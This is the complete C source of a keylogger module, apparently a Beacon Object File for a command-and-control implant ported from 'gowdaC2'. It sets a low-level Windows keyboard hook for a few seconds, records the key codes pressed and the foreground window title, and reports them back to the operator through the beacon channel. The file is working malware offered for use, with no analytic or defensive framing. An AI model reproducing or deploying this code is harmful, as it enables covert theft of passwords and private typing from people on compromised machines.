/*
 * Author:  Dhanush Arvind
 * Ported from gowdaC2
 */

#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT HHOOK   WINAPI USER32$SetWindowsHookExA(int, HOOKPROC, HINSTANCE, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI USER32$UnhookWindowsHookEx(HHOOK);
DECLSPEC_IMPORT LRESULT WINAPI USER32$CallNextHookEx(HHOOK, int, WPARAM, LPARAM);
DECLSPEC_IMPORT BOOL    WINAPI USER32$PeekMessageA(LPMSG, HWND, UINT, UINT, UINT);
DECLSPEC_IMPORT BOOL    WINAPI USER32$TranslateMessage(const MSG*);
DECLSPEC_IMPORT LRESULT WINAPI USER32$DispatchMessageA(const MSG*);
DECLSPEC_IMPORT HWND    WINAPI USER32$GetForegroundWindow(void);
DECLSPEC_IMPORT int     WINAPI USER32$GetWindowTextA(HWND, LPSTR, int);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetTickCount(void);
DECLSPEC_IMPORT void    WINAPI KERNEL32$Sleep(DWORD);

#define KL_WH_KEYBOARD_LL 13
#define MAX_CAP 1024

typedef struct {
    DWORD     vkCode;
    DWORD     scanCode;
    DWORD     flags;
    DWORD     time;
    ULONG_PTR dwExtraInfo;
} KBD_LL;

static int   _cap_vks[MAX_CAP];
static int   _cap_count = 0;
static HHOOK _kb_hook = NULL;

static LRESULT CALLBACK kb_hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && _cap_count < MAX_CAP) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBD_LL *p = (KBD_LL *)lParam;
            _cap_vks[_cap_count++] = (int)p->vkCode;
        }
    }
    return USER32$CallNextHookEx(_kb_hook, nCode, wParam, lParam);
}

void go(char *args, int alen) {
    datap parser;
    int duration_ms = 2000;

    if (alen >= 4) {
        BeaconDataParse(&parser, args, alen);
        duration_ms = BeaconDataInt(&parser);
        if (duration_ms < 500) duration_ms = 500;
        if (duration_ms > 10000) duration_ms = 10000;
    }

    _cap_count = 0;

    char title[256];
    int ti;
    for (ti = 0; ti < (int)sizeof(title); ti++) title[ti] = 0;
    HWND fg = USER32$GetForegroundWindow();
    if (fg) USER32$GetWindowTextA(fg, title, sizeof(title) - 1);

    _kb_hook = USER32$SetWindowsHookExA(KL_WH_KEYBOARD_LL, kb_hook_proc, NULL, 0);
    if (!_kb_hook) {
        BeaconPrintf(CALLBACK_OUTPUT, "KEYLOG:%s\n", title);
        return;
    }

    DWORD start = KERNEL32$GetTickCount();
    MSG msg;
    while ((KERNEL32$GetTickCount() - start) < (DWORD)duration_ms) {
        while (USER32$PeekMessageA(&msg, NULL, 0, 0, 1)) {
            USER32$TranslateMessage(&msg);
            USER32$DispatchMessageA(&msg);
        }
        KERNEL32$Sleep(10);
    }

    USER32$UnhookWindowsHookEx(_kb_hook);
    _kb_hook = NULL;

    fg = USER32$GetForegroundWindow();
    if (fg) {
        for (ti = 0; ti < (int)sizeof(title); ti++) title[ti] = 0;
        USER32$GetWindowTextA(fg, title, sizeof(title) - 1);
    }

    char keys[5200];
    int pos = 0;
    int i;
    for (i = 0; i < _cap_count && pos < 5100; i++) {
        if (i > 0) keys[pos++] = ' ';
        int vk = _cap_vks[i];
        if (vk >= 100) {
            keys[pos++] = '0' + (vk / 100);
            keys[pos++] = '0' + ((vk / 10) % 10);
            keys[pos++] = '0' + (vk % 10);
        } else if (vk >= 10) {
            keys[pos++] = '0' + (vk / 10);
            keys[pos++] = '0' + (vk % 10);
        } else {
            keys[pos++] = '0' + vk;
        }
    }
    keys[pos] = '\0';

    BeaconPrintf(CALLBACK_OUTPUT, "KEYLOG:%s\n%s", title, keys);
}
